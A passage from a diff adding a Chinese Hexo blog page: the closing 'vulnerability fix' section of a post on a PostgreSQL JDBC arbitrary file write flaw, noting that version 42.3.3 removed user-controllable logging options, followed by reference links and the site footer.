+<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>对于PgSQL JDBC来说，其实日志记录并不算是一个很重要的功能，往深了说关于日志记录的等级、文件位置这些并不应该作为一个用户可控的内容，所以在修复版本42.3.3 版本就移除了相应的方法内容和调用</p>
+<p><img src="/../image/achieve/202411/java--ctfshow/1748832412656.png" alt="img"></p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1339">https://forum.butian.net/share/1339</a></p>
+<p><a target="_blank" rel="noopener" href="https://su18.org/post/postgresql-jdbc-attack-and-stuff/">https://su18.org/post/postgresql-jdbc-attack-and-stuff/</a></p>
+
+    </div>
+
+    
+    
+    
+	
+	<div>
+	  
+		
+<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+	  
+	</div>
+
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>wanTh3flag
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://wanth3f1ag.top/2026/02/27/Java%E4%B9%8BPostgreSQL%20JDBC%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/" title="PostgreSQL JDBC 任意文件写入漏洞">https://wanth3f1ag.top/2026/02/27/Java之PostgreSQL JDBC 任意文件写入漏洞/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/javasec/" rel="tag"># javasec</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/02/24/ctfshow%E5%85%A5%E9%97%A8java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="prev" title="ctfshow入门java反序列化">
+                  <i class="fa fa-angle-left"></i> ctfshow入门java反序列化
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/02/27/java%E4%B9%8BTomcat-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="next" title="Tomcat session反序列化漏洞">
+                  Tomcat session反序列化漏洞 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2024 – 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">wanTh3flag</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">3.6m</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">54:01</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
